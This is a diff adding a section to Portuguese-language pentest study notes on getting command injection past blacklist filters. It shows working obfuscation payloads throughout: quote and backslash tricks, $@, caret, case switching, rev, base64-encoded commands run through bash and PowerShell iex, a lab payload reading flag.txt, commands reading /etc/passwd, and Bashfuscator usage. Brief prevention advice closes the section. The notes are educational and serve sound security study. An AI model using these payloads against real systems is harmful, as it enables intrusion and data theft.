@@ -650,3 +650,426 @@ Resultado final:
 | Burp/Caido            | Burlar validações frontend      |                    |
 
 ---
+
+# 🚫 COMANDOS NA BLACKLIST
+
+# 🧠 O que é Blacklist de Comandos?
+
+Blacklist de comandos consiste em uma lista de palavras bloqueadas pela aplicação.
+
+Exemplo:
+
+```php id="17k4s7"
+$blacklist = ['whoami', 'cat', ...SNIP...];
+
+foreach ($blacklist as $word) {
+    if (strpos($_POST['ip'], $word) !== false) {
+        echo "Invalid input";
+    }
+}
+```
+
+---
+
+## 🎯 Objetivo do atacante
+
+O objetivo é:
+
+* modificar visualmente o comando;
+* sem alterar sua execução real.
+
+Ou seja:
+
+```text id="hsvzv0"
+"parecer diferente" para o filtro
+"continuar igual" para o sistema operacional
+```
+
+---
+
+# 🛠️ Técnicas de Bypass
+
+# ✨ Uso de Aspas (`'` e `"`)
+
+Podemos adicionar caracteres que NÃO interferem na execução do comando.
+
+---
+
+## Exemplos
+
+### Aspas simples
+
+```bash id="m9ul7l"
+w'h'o'am'i
+```
+
+---
+
+### Aspas duplas
+
+```bash id="4i5xf2"
+w"h"o"am"i
+```
+
+---
+
+## ⚠️ Regras importantes
+
+* NÃO misturar aspas simples e duplas;
+* a quantidade precisa ser PAR.
+
+---
+
+## ✅ Compatibilidade
+
+Funciona em:
+
+* Linux
+* Windows
+
+---
+
+# 🐧 Bypass com `\` e `$@` (Linux)
+
+## Barra invertida (`\`)
+
+```bash id="0x6v7y"
+w\ho\am\i
+```
+
+---
+
+## `$@`
+
+```bash id="a9vr0h"
+who$@ami
+```
+
+---
+
+## 🧠 Observações
+
+* funciona apenas no Linux;
+* não precisa ser par;
+* quebra a assinatura do comando.
+
+---
+
+# 🪟 Bypass com `^` (Windows)
+
+```cmd id="h6c1af"
+who^ami
+```
+
+---
+
+## ⚠️ Compatibilidade
+
+Funciona apenas no Windows CMD.
+
+---
+
+# 💣 Exemplo Completo de Payload
+
+```text id="yd5k8i"
+ip=127.0.0.1%0a{ca$@t,${PATH:0:1}h$@ome${PATH:0:1}1nj3c70r${PATH:0:1}fl$@ag.txt}
+```
+
+---
+
+## 🔍 Técnicas utilizadas
+
+Esse payload combina:
+
+| Técnica       | Objetivo         |
+| ------------- | ---------------- |
+| `%0a`         | Nova linha       |
+| `${PATH:0:1}` | Recuperar `/`    |
+| `$@`          | Ofuscar comandos |
+| `{}`          | Brace Expansion  |
+
+---
+
+# 🧬 Ofuscação Avançada de Comandos
+
+## ⚠️ Importante
+
+Técnicas simples podem falhar contra:
+
+* WAFs avançados;
+* filtros inteligentes;
+* análise comportamental.
+
+---
+
+# 🔠 Alternar Maiúsculas e Minúsculas
+
+## Exemplo
+
+```bash id="8e4bsy"
+WhOaMi
+```
+
+---
+
+# 🪟 Windows
+
+No Windows:
+
+* CMD NÃO diferencia case;
+* PowerShell NÃO diferencia case.
+
+Então o comando funciona diretamente.
+
+---
+
+# 🐧 Linux
+
+Linux diferencia maiúsculas de minúsculas.
+
+Precisamos converter o texto antes da execução.
+
+---
+
+## Usando `tr`
+
+```bash id="c7l4n5"
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+
+---
+
+## ⚠️ Espaços podem ser bloqueados
+
+Utilizar:
+
+```text id="6ifg1d"
+%09
+```
+
+no lugar de espaço.
+
+---
+
+## Usando variável Bash
+
+```bash id="o2xyhu"
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+---
+
+# 🔄 Comando Invertido
+
+## 🧠 Conceito
+
+1. inverter o comando;
+2. enviar invertido;
+3. desinverter durante execução.
+
+---
+
+# 🐧 Linux
+
+## Invertendo
+
+```bash id="5e3pxf"
+echo 'whoami' | rev
+```
+
+Resultado:
+
+```text id="xxr6sz"
+imaohw
+```
+
+---
+
+## Desinvertendo e executando
+
+```bash id="pf3vfy"
+$(rev<<<'imaohw')
+```
+
+---
+
+# 🪟 Windows
+
+## Inverter string
+
+```powershell id="yq38ee"
+"whoami"[-1..-20] -join ''
+```
+
+---
+
+## Reverter e executar
+
+```powershell id="mjjbtx"
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+---
+
+# 🔐 Comandos Codificados
+
+Podemos codificar payloads para evitar filtros.
+
+---
+
+# 📦 Base64 (Linux)
+
+## Codificando
+
+```bash id="4g0u0f"
+echo -n 'cat /etc/passwd | grep 33' | base64
+```
+
+Resultado:
+
+```text id="pvjzgr"
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+
+---
+
+## Decodificando e executando
+
+```bash id="j4r19y"
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+
+---
+
+# 🪟 Base64 no Windows
+
+## Converter para Base64
+
+```powershell id="8s40gf"
+[Convert]::ToBase64String(
+[System.Text.Encoding]::Unicode.GetBytes('whoami'))
+```
+
+---
+
+## Executar payload codificado
+
+```powershell id="e8b9x4"
+iex "$([System.Text.Encoding]::Unicode.GetString(
+[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+---
+
+# 🤖 Ferramentas de Evasão
+
+## ⚠️ Problema
+
+Algumas vezes:
+
+* a ofuscação manual não é suficiente;
+* o payload fica muito complexo.
+
+---
+
+# 🐧 Bashfuscator (Linux)
+
+Ferramenta automática de ofuscação Bash.
+
+## Exemplo
+
+```bash id="dlvql1"
+bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+---
+
+# ⚙️ Parâmetros
+
+| Parâmetro       | Função                        |
+| --------------- | ----------------------------- |
+| `-c`            | Comando que será ofuscado     |
+| `-s 1`          | Tamanho do payload            |
+| `-t 1`          | Complexidade da técnica       |
+| `--no-mangling` | Não altera nomes de variáveis |
+| `--layers 1`    | Camadas de ofuscação          |
+
+---
+
+## 📌 Escalas
+
+### `-s` e `-t`
+
+Valores:
+
+```text id="s7ihj8"
+1 → simples
+2 → médio
+3 → avançado
+```
+
+---
+
+# ▶️ Executando o resultado
+
+```bash id="u2m0n0"
+bash -c "resultado_do_bashfuscator"
+```
+
+---
+
+# 🛡️ Prevenção
+
+# ✅ Evitar execução de comandos do sistema
+
+Principalmente quando houver:
+
+* input do usuário;
+* concatenação dinâmica.
+
+---
+
+# ✅ Validar entrada do usuário
+
+Utilizar:
+
+* allowlist;
+* regex;
+* filtros integrados da linguagem.
+
+---
+
+# ✅ Sanitizar entradas
+
+Sanitização significa:
+
+```text id="85o70y"
+remover caracteres especiais desnecessários
+```
+
+Exemplos perigosos:
+
+```text id="a4l4mn"
+;
+|
+&
+$
+`
+```
+
+---
+
+# 📌 Resumo Rápido
+
+| Técnica        | Objetivo                      |
+| -------------- | ----------------------------- |
+| `'` e `"`      | Quebrar assinatura do comando |
+| `\` e `$@`     | Ofuscação Linux               |
+| `^`            | Ofuscação Windows             |
+| Case alternado | Burlar filtros simples        |
+| `rev`          | Inverter comandos             |
+| Base64         | Ocultar payload               |
+| Bashfuscator   | Automatizar evasão            |
+
+---
+
